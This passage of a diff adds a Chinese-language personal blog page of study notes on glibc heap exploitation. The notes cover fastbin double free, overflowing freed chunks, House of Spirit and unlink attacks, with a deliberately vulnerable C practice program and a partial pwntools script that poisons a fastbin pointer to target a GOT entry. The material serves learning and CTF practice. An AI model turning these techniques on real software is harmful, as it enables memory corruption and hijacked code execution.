+<li>double free</li>
+<li>overflow</li>
+</ul>
+</li>
+</ul>
+<h3 id="Fastbin-Sanity-Check"><a href="#Fastbin-Sanity-Check" class="headerlink" title="Fastbin Sanity Check"></a>Fastbin Sanity Check</h3><ul>
+<li>malloc从bin里取出，要从正确的bin里拿出来，即chunk size要正确</li>
+<li>free时，nextchunk size要对</li>
+<li>free时会检查bin里第一个chunk是不是跟这个要free的chunk相同</li>
+</ul>
+<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><ul>
+<li>fasttop只检查bin里的第一个chunk，只要不是连续free同一个chunk就行</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure>
+
+<p>bin形成了一个loop:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x602000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602010:	0x0000000000602030	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602040:	0x0000000000602000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>double free造成类似uaf的效果，可以改掉还在bin里的chunk的fd标志位</p>
+<ul>
+<li>bin是由fd连起来的linked list，改掉fd可以让linked list接往任意地址</li>
+<li>多次malloc后，就可以拿到一个地址可以控制的chunk</li>
+</ul>
+</li>
+<li><p>取出的chunk的size的标志位要正确，所以不是完全任意地址，要能构造假的size</p>
+<ul>
+<li>用stack上的变量作size，可以malloc一个stack上的地址</li>
+<li>GOT上，用64bit地址最常见的0x40作size</li>
+</ul>
+</li>
+<li><p>取得chunk后，有机会对该地址任意读写</p>
+</li>
+</ul>
+<h3 id="Overflow-Freed-chunk"><a href="#Overflow-Freed-chunk" class="headerlink" title="Overflow Freed chunk"></a>Overflow Freed chunk</h3><ul>
+<li>如果有heap overflow，可以覆盖下一个chunk的fd指标</li>
+<li>先free掉下一个chunk再进行overflow</li>
+<li>Overflow时要注意下一个chunk的size是否正确</li>
+</ul>
+<p>测试程序：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Problem Credit: seanwupi */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">(<span class="keyword">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">  system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">int</span> cmd, idx, sz;</span><br><span class="line">  <span class="keyword">char</span>* ptr[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. malloc + gets\n2. free\n3. puts"</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;cmd, &amp;idx);</span><br><span class="line">    idx %= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmd==<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;sz);</span><br><span class="line">      ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">      gets(ptr[idx]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">      ptr[idx] = <span class="number">0</span> ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>覆盖地址方法（这里可能是libc版本的缘故，并没有在got表上下文中找到”\x40”作为fake chunk的size，所以做到填充的前一步），之后覆盖puts_got为system_addr，然后puts(3)即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary_name = <span class="string">'overflow1'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	io = process(<span class="string">'./overflow1'</span>)</span><br><span class="line">    	<span class="comment">#libc = ELF('./libc.so.6',checksec=False)</span></span><br><span class="line">    	<span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    	io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line">    	libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./'</span>+binary_name,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc.so.6')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">    	gdb.attach(io,a)</span><br><span class="line">    	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        	raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gets</span><span class="params">(index,sz,buff)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1 "</span>+str(index)+<span class="string">" "</span>+str(sz)+<span class="string">" "</span>+buff)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"2 "</span>+str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"3 "</span>+str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gets(<span class="number">0</span>,<span class="number">56</span>,<span class="string">"AAAA"</span>)</span><br><span class="line">gets(<span class="number">1</span>,<span class="number">56</span>,<span class="string">"BBBB"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_got=<span class="number">0x601020</span></span><br><span class="line">system_addr=<span class="number">0x4007F6</span></span><br><span class="line"></span><br><span class="line">gets(<span class="number">2</span>,<span class="number">56</span>,<span class="string">"A"</span>*<span class="number">56</span>+p64(<span class="number">0x41</span>)+p64(puts_got))</span><br><span class="line">gets(<span class="number">3</span>,<span class="number">56</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#gets(4,56,patch+system_addr)</span></span><br><span class="line"><span class="comment">#puts(3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Free-Arbitrary-Address-House-of-Spirit"><a href="#Free-Arbitrary-Address-House-of-Spirit" class="headerlink" title="Free Arbitrary Address(House of Spirit)"></a>Free Arbitrary Address(House of Spirit)</h3><ul>
+<li>其他overflow可以改掉一个原本由malloc得到的指针p，free(p)时会被改掉的指针进入fastbin，下次malloc是就可以拿到</li>
+</ul>
+<h2 id="Unlink-Exploitation"><a href="#Unlink-Exploitation" class="headerlink" title="Unlink Exploitation"></a>Unlink Exploitation</h2><h3 id="合并-freed-chunks"><a href="#合并-freed-chunks" class="headerlink" title="合并 freed chunks"></a>合并 freed chunks</h3><ul>
+<li>非fastbin chunk在free掉时，会跟前后的freed chunk合并</li>
+</ul>
+<h3 id="unlink-Macro"><a href="#unlink-Macro" class="headerlink" title="unlink() Macro"></a>unlink() Macro</h3><ul>
+<li>unlink()是用来把chunk移出bin用的，从double linked list移除</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P,BK,FD&#123;       \</span></span><br><span class="line">  FD=P-&gt;fd;                   \</span><br><span class="line">  BK=P-&gt;BK;                   \</span><br><span class="line">  FD-&gt;bk=BK;                  \</span><br><span class="line">  BK-&gt;fd=FD;                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
+<li>如果有overflow可以覆盖到某个chunk q的pre size,free q时可以控制unlink(p)的p</li>
+<li>使得o的内容也可控</li>
+<li>利用unlink机制造成dword shoot：<ul>
+<li>FD=p-&gt;fd=free@got.plt-0x18</li>
+<li>BK=p-&gt;bk=shellcode</li>
+</ul>
+</li>
+</ul>
+<p>现在已经不可用，现在会进行检查：</p>
+<ul>
+<li>实际的unlink会检查double linked list是不是合法的<ul>
+<li>p-&gt;fd-&gt;bk==p</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P,BK,FD&#123;                          \</span></span><br><span class="line">  FD=P-&gt;fd;                                      \</span><br><span class="line">  BK=P-&gt;BK;                                      \</span><br><span class="line">  <span class="keyword">if</span>(FD-&gt;bk!=P||BK-&gt;fd!=P)                       \</span><br><span class="line">    malloc_printrtr(check_action,<span class="string">"corrupted"</span>,P); \</span><br><span class="line">  <span class="keyword">else</span>&#123;                                          \</span><br><span class="line">    FD-&gt;bk=BK;                                   \</span><br><span class="line">    BK-&gt;fd=FD;                                   \</span><br><span class="line">  &#125;                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Overwrite-Heap-Pointer"><a href="#Overwrite-Heap-Pointer" class="headerlink" title="Overwrite Heap Pointer"></a>Overwrite Heap Pointer</h3><ul>
+<li>unlink检查绕过，需要以下一些条件<ul>
+<li>一个指向heap内的指针</li>
+<li>存放该指针的地址已知</li>
+<li>可以对该指针写入多次</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=&amp;p<span class="number">-0x18</span>;</span><br><span class="line">p-&gt;bk=&amp;p<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/18/safeunlink/" rel="next" title="突破safe unlink">
+                <i class="fa fa-chevron-left"></i> 突破safe unlink
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Glibc-Heap-Exp-1"><span class="nav-number">1.</span> <span class="nav-text">Glibc Heap Exp-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Glibc-Heap-Overview"><span class="nav-number">1.1.</span> <span class="nav-text">Glibc Heap Overview</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GLibc-Heap"><span class="nav-number">1.1.1.</span> <span class="nav-text">GLibc Heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap相关的漏洞利用"><span class="nav-number">1.1.2.</span> <span class="nav-text">Heap相关的漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Glibc-Heap相关概念"><span class="nav-number">1.1.3.</span> <span class="nav-text">Glibc Heap相关概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译glibc2-23时的一个问题"><span class="nav-number">1.1.4.</span> <span class="nav-text">编译glibc2.23时的一个问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用docker时的一个问题"><span class="nav-number">1.1.5.</span> <span class="nav-text">使用docker时的一个问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chunk"><span class="nav-number">1.1.6.</span> <span class="nav-text">Chunk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chunk-Header标志位"><span class="nav-number">1.1.7.</span> <span class="nav-text">Chunk Header标志位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Size-64-bit"><span class="nav-number">1.1.8.</span> <span class="nav-text">Size(64 bit)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap操作"><span class="nav-number">1.1.9.</span> <span class="nav-text">Heap操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#free-的例子"><span class="nav-number">1.1.9.1.</span> <span class="nav-text">free 的例子</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-UAF"><span class="nav-number">1.2.</span> <span class="nav-text">Exploit:UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用chunk的回收特性"><span class="nav-number">1.2.1.</span> <span class="nav-text">利用chunk的回收特性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin-Corruption"><span class="nav-number">1.3.</span> <span class="nav-text">Fastbin Corruption</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin"><span class="nav-number">1.3.1.</span> <span class="nav-text">fastbin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-corruption"><span class="nav-number">1.3.2.</span> <span class="nav-text">fastbin corruption</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastbin-Sanity-Check"><span class="nav-number">1.3.3.</span> <span class="nav-text">Fastbin Sanity Check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-double-free"><span class="nav-number">1.3.4.</span> <span class="nav-text">fastbin double free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Overflow-Freed-chunk"><span class="nav-number">1.3.5.</span> <span class="nav-text">Overflow Freed chunk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Free-Arbitrary-Address-House-of-Spirit"><span class="nav-number">1.3.6.</span> <span class="nav-text">Free Arbitrary Address(House of Spirit)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unlink-Exploitation"><span class="nav-number">1.4.</span> <span class="nav-text">Unlink Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#合并-freed-chunks"><span class="nav-number">1.4.1.</span> <span class="nav-text">合并 freed chunks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink-Macro"><span class="nav-number">1.4.2.</span> <span class="nav-text">unlink() Macro</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.4.3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Overwrite-Heap-Pointer"><span class="nav-number">1.4.4.</span> <span class="nav-text">Overwrite Heap Pointer</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
